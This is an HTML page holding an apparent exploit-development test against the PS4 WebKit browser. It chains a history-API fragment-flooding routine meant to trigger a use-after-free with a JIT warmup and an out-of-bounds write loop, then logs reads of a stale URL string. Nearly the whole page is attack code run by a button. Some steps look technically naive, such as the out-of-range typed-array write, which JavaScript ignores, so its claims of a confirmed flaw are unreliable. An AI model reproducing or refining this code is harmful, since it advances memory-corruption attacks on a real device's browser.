<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF + JIT Window Fusion</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:16px; padding:10px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>
<body>

<h2>UAF + JIT (Inside Window Only)</h2>
<button onclick="run()">RUN FINAL TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

/* ===============================
   PHASE 1 — CONFIRMED UAF TRIGGER
   =============================== */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
}

/* ===============================
   PHASE 2 — JIT SETUP
   =============================== */
function jitFunc(arr){
    let sum = 0;
    for(let i=0;i<256;i++){
        sum += arr[i & 15];
    }
    return sum;
}

function warmupJIT(arr){
    for(let i=0;i<5000;i++)
        jitFunc(arr);
}

/* ===============================
   PHASE 3 — FINAL TEST
   =============================== */
async function run(){
    logEl.textContent = "";

    await triggerUAF();

    /* --- Snapshot string inside window --- */
    let s = document.URL;
    log("=== BASELINE READ (INSIDE WINDOW) ===");
    log("URL.length = " + s.length);
    [32,64,128,256,512,1024].forEach(o=>{
        log(`charCodeAt(${o}) = ${s.charCodeAt(o)}`);
    });

    /* --- Prepare fake array for JIT --- */
    let buf = new ArrayBuffer(0x40);
    let arr = new Uint32Array(buf);
    for(let i=0;i<arr.length;i++)
        arr[i] = 0x41414141;

    log("=== JIT WARMUP ===");
    warmupJIT(arr);

    /* --- CRITICAL: JIT LOOP INSIDE UAF WINDOW --- */
    log("=== JIT OOB LOOP (INSIDE WINDOW) ===");
    for(let i=0;i<20000;i++){
        arr[16] = 0xdead0000 + (i & 0xff);
        jitFunc(arr);
    }

    /* --- CLOSE WINDOW --- */
    log(">>> FRAGMENT COLLAPSE <<<");
    location.hash = "#X";
    await sleep(50);

    /* --- POST COLLAPSE READ --- */
    log("=== POST-COLLAPSE READ ===");
    log("URL.length = " + s.length);
    [32,64,128,256,512,1024].forEach(o=>{
        log(`charCodeAt(${o}) = ${s.charCodeAt(o)}`);
    });

    log("=== TEST END ===");
}
</script>
</body>
</html>
